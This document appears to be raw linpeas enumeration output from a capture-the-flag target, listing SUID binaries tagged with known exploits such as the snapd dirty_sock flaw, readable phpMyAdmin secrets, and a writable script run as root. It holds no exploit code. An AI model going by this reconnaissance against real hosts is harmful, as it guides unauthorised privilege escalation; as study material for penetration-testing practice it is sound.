-rwsr-sr-x 1 root root 101K Jun 21  2019 /snap/core/7270/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                                                                               
-rwsr-xr-- 1 root dip 386K Jun 12  2018 /snap/core/7270/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 43K Oct 16  2018 /snap/core18/1066/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                        
-rwsr-xr-x 1 root root 63K Mar 10  2017 /snap/core18/1066/bin/ping
-rwsr-xr-x 1 root root 44K Mar 23  2019 /snap/core18/1066/bin/su
-rwsr-xr-x 1 root root 27K Oct 16  2018 /snap/core18/1066/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 75K Mar 23  2019 /snap/core18/1066/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Mar 23  2019 /snap/core18/1066/usr/bin/chsh
-rwsr-xr-x 1 root root 75K Mar 23  2019 /snap/core18/1066/usr/bin/gpasswd
-rwsr-xr-x 1 root root 40K Mar 23  2019 /snap/core18/1066/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 59K Mar 23  2019 /snap/core18/1066/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                         
-rwsr-xr-x 1 root root 146K Jan 18  2018 /snap/core18/1066/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Jun 10  2019 /snap/core18/1066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 427K Mar  4  2019 /snap/core18/1066/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 43K Aug 23  2019 /snap/core18/1223/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                        
-rwsr-xr-x 1 root root 63K Jun 28  2019 /snap/core18/1223/bin/ping
-rwsr-xr-x 1 root root 44K Mar 23  2019 /snap/core18/1223/bin/su
-rwsr-xr-x 1 root root 27K Aug 23  2019 /snap/core18/1223/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 75K Mar 23  2019 /snap/core18/1223/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Mar 23  2019 /snap/core18/1223/usr/bin/chsh
-rwsr-xr-x 1 root root 75K Mar 23  2019 /snap/core18/1223/usr/bin/gpasswd
-rwsr-xr-x 1 root root 40K Mar 23  2019 /snap/core18/1223/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 59K Mar 23  2019 /snap/core18/1223/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                         
-rwsr-xr-x 1 root root 146K Jan 18  2018 /snap/core18/1223/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Jun 10  2019 /snap/core18/1223/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 427K Mar  4  2019 /snap/core18/1223/usr/lib/openssh/ssh-keysign

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                        
-rwxr-sr-x 1 root shadow 23K Mar 23  2019 /usr/bin/expiry                                                               
-rwxr-sr-x 1 root tty 14K Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root ssh 355K Mar  4  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root mlocate 43K Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root crontab 39K Nov 16  2017 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 71K Mar 23  2019 /usr/bin/chage
-rwxr-sr-x 1 root tty 31K Mar  5  2020 /usr/bin/wall
-rwxr-sr-x 1 root mail 14K May 28  2019 /usr/lib/evolution/camel-lock-helper-1.2
-rwsr-sr-x 1 root root 10K Dec 18  2019 /usr/lib/xorg/Xorg.wrap
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/7917/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/7917/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 61K Mar 25  2019 /snap/core/7917/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36K Apr  6  2016 /snap/core/7917/usr/bin/crontab
-rwxr-sr-x 1 root mail 15K Dec  7  2013 /snap/core/7917/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 23K Mar 25  2019 /snap/core/7917/usr/bin/expiry
-rwxr-sr-x 3 root mail 15K Dec  4  2012 /snap/core/7917/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 15K Dec  4  2012 /snap/core/7917/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 15K Dec  4  2012 /snap/core/7917/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 351K Mar  4  2019 /snap/core/7917/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27K Aug 23  2019 /snap/core/7917/usr/bin/wall
-rwsr-sr-x 1 root root 105K Oct  1  2019 /snap/core/7917/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                                                                               
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/7270/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/7270/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 61K Mar 25  2019 /snap/core/7270/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36K Apr  6  2016 /snap/core/7270/usr/bin/crontab
-rwxr-sr-x 1 root mail 15K Dec  7  2013 /snap/core/7270/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 23K Mar 25  2019 /snap/core/7270/usr/bin/expiry
-rwxr-sr-x 3 root mail 15K Dec  4  2012 /snap/core/7270/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 15K Dec  4  2012 /snap/core/7270/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 15K Dec  4  2012 /snap/core/7270/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 351K Mar  4  2019 /snap/core/7270/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27K May 16  2019 /snap/core/7270/usr/bin/wall
-rwsr-sr-x 1 root root 101K Jun 21  2019 /snap/core/7270/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                                                                               
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /snap/core18/1066/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /snap/core18/1066/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 71K Mar 23  2019 /snap/core18/1066/usr/bin/chage
-rwxr-sr-x 1 root shadow 23K Mar 23  2019 /snap/core18/1066/usr/bin/expiry
-rwxr-sr-x 1 root crontab 355K Mar  4  2019 /snap/core18/1066/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 31K Oct 16  2018 /snap/core18/1066/usr/bin/wall
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /snap/core18/1223/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /snap/core18/1223/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 71K Mar 23  2019 /snap/core18/1223/usr/bin/chage
-rwxr-sr-x 1 root shadow 23K Mar 23  2019 /snap/core18/1223/usr/bin/expiry
-rwxr-sr-x 1 root crontab 355K Mar  4  2019 /snap/core18/1223/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 31K Aug 23  2019 /snap/core18/1223/usr/bin/wall

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so                                                
/etc/ld.so.conf                                                                                                         
Content of /etc/ld.so.conf:                                                                                             
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf                                                                      
  - /usr/lib/x86_64-linux-gnu/libfakeroot                                                                               
  /etc/ld.so.conf.d/libc.conf
  - /usr/local/lib                                                                                                      
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu                                                                                     
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Capabilities                                                                                               
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                         
══╣ Current shell capabilities                                                                                          
CapInh:  0x0000000000000000=                                                                                            
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=

══╣ Parent process capabilities
CapInh:  0x0000000000000000=                                                                                            
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=


Files with capabilities (limited to 50):
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                         
                                                                                                                        
╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3194 Mar 27  2018 sbin.dhclient                                                                 
-rw-r--r-- 1 root root 10625 Jun 19  2019 usr.bin.evince
-rw-r--r-- 1 root root  8493 May  8  2020 usr.bin.firefox
-rw-r--r-- 1 root root  2857 Apr  7  2018 usr.bin.man
-rw-r--r-- 1 root root 23936 Oct 30  2019 usr.lib.snapd.snap-confine.real
-rw-r--r-- 1 root root   540 Feb 26  2018 usr.sbin.cups-browsed
-rw-r--r-- 1 root root  5552 May 30  2019 usr.sbin.cupsd
-rw-r--r-- 1 root root   643 Jan 17  2018 usr.sbin.ippusbxd
-rw-r--r-- 1 root root   730 Jan 30  2020 usr.sbin.mysqld
-rw-r--r-- 1 root root  1550 Apr 24  2018 usr.sbin.rsyslogd
-rw-r--r-- 1 root root  1353 Apr  1  2018 usr.sbin.tcpdump

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                                 
files with acls in searched folders Not Found                                                                           
                                                                                                                        
╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                       
total 44                                                                                                                
drwxr-xr-x   2 root root  4096 Apr  2  2020 .
drwxr-xr-x 130 root root 12288 Jun 16  2022 ..
-rw-r--r--   1 root root    96 Aug 20  2018 01-locale-fix.sh
-rw-r--r--   1 root root   825 Jun  5  2019 apps-bin-path.sh
-rw-r--r--   1 root root   664 Apr  2  2018 bash_completion.sh
-rw-r--r--   1 root root  1003 Dec 29  2015 cedilla-portuguese.sh
-rw-r--r--   1 root root   652 Apr  3  2019 input-method-config.sh
-rw-r--r--   1 root root  1941 Jul 16  2018 vte-2.91.sh
-rw-r--r--   1 root root   954 May  2  2018 xdg_dirs_desktop_session.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                         
                                                                                                                        
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                            
═╣ Credentials in fstab/mtab? ........... No                                                                            
═╣ Can I read shadow files? ............. No                                                                            
═╣ Can I read shadow plists? ............ No                                                                            
═╣ Can I write shadow plists? ........... No                                                                            
═╣ Can I read opasswd file? ............. No                                                                            
═╣ Can I write in network-scripts? ...... No                                                                            
═╣ Can I read root folder? .............. No                                                                            
                                                                                                                        
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                  
/home/love/local.txt
/root/
/var/www/html/robots.txt

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
-rw-r--r-- 1 root root 33 May 15 19:19 /home/love/local.txt                                                             

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root dip 1093 Aug  6  2019 /etc/ppp/peers/provider                                                         
-rw-r----- 1 root www-data 519 Apr  2  2020 /etc/phpmyadmin/config-db.php
-rw-r----- 1 root www-data 8 Apr  2  2020 /etc/phpmyadmin/htpasswd.setup
-rw-r----- 1 root dip 656 Aug  6  2019 /etc/chatscripts/provider
-rw-r----- 1 root www-data 0 Apr  2  2020 /var/lib/phpmyadmin/config.inc.php
-rw-r----- 1 root www-data 68 Apr  2  2020 /var/lib/phpmyadmin/blowfish_secret.inc.php
-rw-r----- 1 root adm 2150 May 26  2020 /var/log/apport.log.1
-rw-r----- 1 root adm 27599 May 23  2020 /var/log/apt/term.log.3.gz
-rw-r----- 1 root adm 1263 Jun 16  2022 /var/log/apt/term.log.1.gz
-rw-r----- 1 root adm 0 Feb 16 01:21 /var/log/apt/term.log
-rw-r----- 1 root adm 7630 Oct 21  2019 /var/log/apt/term.log.4.gz
-rw-r----- 1 root adm 2964 May 27  2020 /var/log/apt/term.log.2.gz
-rw-r----- 1 root adm 0 Jun 16  2022 /var/log/apport.log
-rw-r----- 1 root adm 15259886 May 15 20:54 /var/log/apache2/access.log
-rw-r----- 1 root adm 4955158 Apr  9  2020 /var/log/apache2/access.log.3.gz
-rw-r----- 1 root adm 8539 May 27  2020 /var/log/apache2/access.log.2.gz
-rw-r----- 1 root adm 570 Feb 16 01:21 /var/log/apache2/error.log.2.gz
-rw-r----- 1 root adm 880 Apr  8  2020 /var/log/apache2/error.log.6.gz
-rw-r----- 1 root adm 3091432 Apr  3  2020 /var/log/apache2/error.log.7.gz
-rw-r----- 1 root adm 2321 May 15 20:50 /var/log/apache2/error.log
-rw-r----- 1 root adm 909 May 15 19:21 /var/log/apache2/error.log.1
-rw-r----- 1 root adm 49124 May 15 19:21 /var/log/apache2/access.log.1
-rw-r----- 1 root adm 3820 Jun 16  2022 /var/log/apache2/error.log.3.gz
-rw-r----- 1 root adm 3283757 Apr  3  2020 /var/log/apache2/access.log.6.gz
-rw-r----- 1 root adm 856 Apr  9  2020 /var/log/apache2/error.log.5.gz
-rw-r----- 1 root adm 2414 Apr  8  2020 /var/log/apache2/access.log.4.gz
-rw-r----- 1 root adm 5962292 May 26  2020 /var/log/apache2/error.log.4.gz
-rw-r----- 1 root adm 3392 Apr  3  2020 /var/log/apache2/access.log.5.gz
-rw-r----- 1 root adm 184 May 27  2020 /var/log/cups/error_log.1
-rw-r----- 1 root adm 537 Jun 16  2022 /var/log/cups/access_log.3.gz
-rw-r----- 1 root adm 224 May 15 19:21 /var/log/cups/access_log
-rw-r----- 1 root adm 778 May 15 19:21 /var/log/cups/access_log.1
-rw-r----- 1 root adm 126 Oct 21  2019 /var/log/cups/error_log.2.gz
-rw-r----- 1 root adm 258 Apr  8  2020 /var/log/cups/access_log.6.gz
-rw-r----- 1 root adm 516 May 26  2020 /var/log/cups/access_log.4.gz
-rw-r----- 1 root adm 0 Jun 16  2022 /var/log/cups/error_log
-rw-r----- 1 root adm 297 Apr  9  2020 /var/log/cups/access_log.5.gz
-rw-r----- 1 root adm 523 Apr  3  2020 /var/log/cups/access_log.7.gz
-rw-r----- 1 root adm 389 Feb 16 01:21 /var/log/cups/access_log.2.gz
-rw-r----- 1 root adm 207 Apr  8  2020 /var/log/apport.log.2.gz
-rw-r----- 1 root dip 656 Oct  1  2019 /snap/core/7917/etc/chatscripts/provider
-rw-r----- 1 root dip 1093 Oct  1  2019 /snap/core/7917/etc/ppp/peers/provider
-rw-r----- 1 root adm 31 Oct  1  2019 /snap/core/7917/var/log/dmesg
-rw-r----- 1 root adm 31 Oct  1  2019 /snap/core/7917/var/log/fsck/checkfs
-rw-r----- 1 root adm 31 Oct  1  2019 /snap/core/7917/var/log/fsck/checkroot
-rw-r----- 1 root dip 656 Jun 21  2019 /snap/core/7270/etc/chatscripts/provider
-rw-r----- 1 root dip 1093 Jun 21  2019 /snap/core/7270/etc/ppp/peers/provider
-rw-r----- 1 root adm 31 Jun 21  2019 /snap/core/7270/var/log/dmesg
-rw-r----- 1 root adm 31 Jun 21  2019 /snap/core/7270/var/log/fsck/checkfs
-rw-r----- 1 root adm 31 Jun 21  2019 /snap/core/7270/var/log/fsck/checkroot

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                       
/dev/mqueue                                                                                                             
/dev/shm
/home/love
/run/lock
/run/Serv-U-Running.pid
/run/user/1000
/run/user/1000/gnupg
/run/user/1000/systemd
/snap/core18/1066/run/lock
/snap/core18/1066/tmp
/snap/core18/1066/var/tmp
/snap/core18/1223/run/lock
/snap/core18/1223/tmp
/snap/core18/1223/var/tmp
/snap/core/7270/run/lock
/snap/core/7270/tmp
/snap/core/7270/var/tmp
/snap/core/7917/run/lock
/snap/core/7917/tmp
/snap/core/7917/var/tmp
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/usr/local/download/SU-FTP-Server-Linux-64bit-v15.1.6
/usr/local/Serv-U/Scripts/runasroot.sh
/usr/local/Serv-U/Serv-U.Archive
/usr/local/Serv-U/Serv-U.Archive.Backup
/usr/local/Serv-U/Serv-U-StartupLog.txt
/var/crash
/var/lib/php/sessions
/var/metrics
/var/tmp
/var/tmp/Serv-U-Engine-Tray-SharedMemory
/var/www/html
/var/www/html/election
/var/www/html/election/card.php
/var/www/html/election/.htaccess
/var/www/html/election/license.tp
/var/www/html/index.html
/var/www/html/phpinfo.php
/var/www/html/robots.txt

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                       
  Group love:                                                                                                           
/home/love                                                                                                              
  Group www-data:
/var/tmp                                                                                                                
/var/mail
/var/local
/var/www
/var/www/.local
/var/www/.local/share
/var/www/.local/share/nano
/var/www/.bash_history
/var/www/html
/var/www/html/phpinfo.php
/var/www/html/index.html
/var/www/html/election
/var/www/html/election/.htaccess
/var/www/html/election/license.tp
/var/lib/ucf/cache/:etc:papersize
/var/lib/ubiquity
/var/lib/ubiquity/os-prober-cache
/var/lib/php/sessions
/var/lib/apt/cdroms.list
/var/log/installer
/var/log/installer/initial-status.gz
/var/log/hp/tmp
/var/spool/cron/crontabs
  Group lpadmin:
/usr/share/ppd/custom                                                                                                   



                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                     
                            ╚═════════════════════════╝                                                                 
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                              
/usr/bin/gettext.sh                                                                                                     
/usr/bin/amuFormat.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2023-02-18+04:12:23.7461051040 /etc/kernel/prerm.d/vboxadd                                                              
2023-02-18+04:12:23.7461051040 /etc/kernel/postinst.d/vboxadd
2022-06-16+20:13:10.1559852410 /home/love/.config/pulse/75035b71b2ca48c6967bcbb5e0ab236e-default-source
2022-06-16+20:13:10.1559852410 /home/love/.config/pulse/75035b71b2ca48c6967bcbb5e0ab236e-default-sink
2022-06-16+20:13:03.9408789230 /home/love/.ICEauthority
2020-05-27+15:52:17.2995985250 /var/www/.bash_history
2020-05-27+15:05:59.3250151920 /home/love/.local/share/gnome-shell/application_state
2020-05-26+16:06:42.7867809120 /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.sqlite-wal
2020-05-26+16:06:39.6252007810 /home/love/.mozilla/firefox/y55nwd4d.default-release/prefs.js
2020-05-26+16:04:38.1805036690 /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite
2020-05-26+16:04:38.0244256650 /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.sqlite
2020-05-26+16:04:37.5561916440 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/social-tracking-protection-facebook-digest256.vlpset
2020-05-26+16:04:37.3120696330 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/social-tracking-protection-facebook-digest256.sbstore
2020-05-26+16:04:36.7998136110 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/base-cryptomining-track-digest256.vlpset
2020-05-26+16:04:36.6197236030 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/base-cryptomining-track-digest256.sbstore
2020-05-26+16:04:36.2635455900 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/analytics-track-digest256.vlpset
2020-05-26+16:04:36.0874575800 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/analytics-track-digest256.sbstore
2020-05-26+16:04:35.7512895660 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/social-tracking-protection-linkedin-digest256.vlpset
2020-05-26+16:04:35.5591935580 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/social-tracking-protection-linkedin-digest256.sbstore
2020-05-26+16:04:35.3871075530 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/ads-track-digest256.vlpset
2020-05-26+16:04:35.1790035420 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/ads-track-digest256.sbstore
2020-05-26+16:04:35.0229255360 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/social-track-digest256.vlpset
2020-05-26+16:04:34.8748515300 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/social-track-digest256.sbstore
2020-05-26+16:04:34.6707495220 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/social-tracking-protection-twitter-digest256.vlpset
2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/social-tracking-protection-twitter-digest256.sbstore
2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/mozplugin-block-digest256.vlpset
2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/mozplugin-block-digest256.sbstore
2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/google-trackwhite-digest256.sbstore
2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/google4/goog-unwanted-proto.vlpset
2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/google4/goog-unwanted-proto.metadata
2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/google4/goog-phish-proto.vlpset
2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/google4/goog-malware-proto.vlpset
2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/google4/goog-malware-proto.metadata
2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/google4/goog-downloadwhite-proto.vlpset
2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/google4/goog-downloadwhite-proto.metadata
2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/google4/goog-badbinurl-proto.vlpset
2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/google4/goog-badbinurl-proto.metadata
2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/except-flashsubdoc-digest256.sbstore
2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/content-track-digest256.vlpset
2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/block-flashsubdoc-digest256.vlpset
2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/block-flashsubdoc-digest256.sbstore
2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/block-flash-digest256.vlpset
2020-05-26+16:04:34.3545915060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/base-fingerprinting-track-digest256.sbstore
2020-05-26+16:04:34.3505895050 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/mozstd-trackwhite-digest256.vlpset
2020-05-26+16:04:34.3505895050 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/mozstd-trackwhite-digest256.sbstore
2020-05-26+16:04:34.3505895050 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/google-trackwhite-digest256.vlpset
2020-05-26+16:04:34.3505895050 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/google4/goog-phish-proto.metadata
2020-05-26+16:04:34.3505895050 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/except-flashsubdoc-digest256.vlpset
2020-05-26+16:04:34.3505895050 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/except-flash-digest256.vlpset
2020-05-26+16:04:34.3505895050 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/except-flash-digest256.sbstore
2020-05-26+16:04:34.3505895050 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/except-flashallow-digest256.sbstore
2020-05-26+16:04:34.3505895050 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/block-flash-digest256.sbstore
2020-05-26+16:04:34.3505895050 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/base-fingerprinting-track-digest256.vlpset
2020-05-26+16:04:34.3505895050 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/allow-flashallow-digest256.vlpset
2020-05-26+16:04:34.3505895050 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/allow-flashallow-digest256.sbstore
2020-05-26+16:04:34.3465875060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/except-flashallow-digest256.vlpset
2020-05-26+16:04:34.3465875060 /home/love/.cache/mozilla/firefox/y55nwd4d.default-release/safebrowsing/content-track-digest256.sbstore
2020-05-26+16:04:32.6537414310 /home/love/.mozilla/firefox/y55nwd4d.default-release/favicons.sqlite-wal
2020-05-26+16:04:32.5656974270 /home/love/.mozilla/firefox/y55nwd4d.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.sqlite
2020-05-26+16:04:31.9133713990 /home/love/.mozilla/firefox/y55nwd4d.default-release/cookies.sqlite-wal
2020-05-26+16:04:26.4586451710 /home/love/.mozilla/firefox/y55nwd4d.default-release/protections.sqlite
2020-05-26+16:04:16.6377367580 /home/love/.mozilla/firefox/y55nwd4d.default-release/storage.sqlite
2020-05-26+16:04:14.1204786520 /home/love/.mozilla/firefox/y55nwd4d.default-release/cookies.sqlite
2020-05-26+16:04:10.6347364960 /home/love/.mozilla/firefox/y55nwd4d.default-release/compatibility.ini
2020-05-26+16:04:10.5346864910 /home/love/.mozilla/firefox/y55nwd4d.default-release/.parentlock
2020-05-26+16:01:03.9254206540 /etc/init.d/Serv-U
2020-05-26+16:00:55.1970582800 /usr/local/Serv-U/uninstall
2020-05-26+15:49:57.7441859260 /home/love/.local/share/app-info/xmls/extensions-web.xml
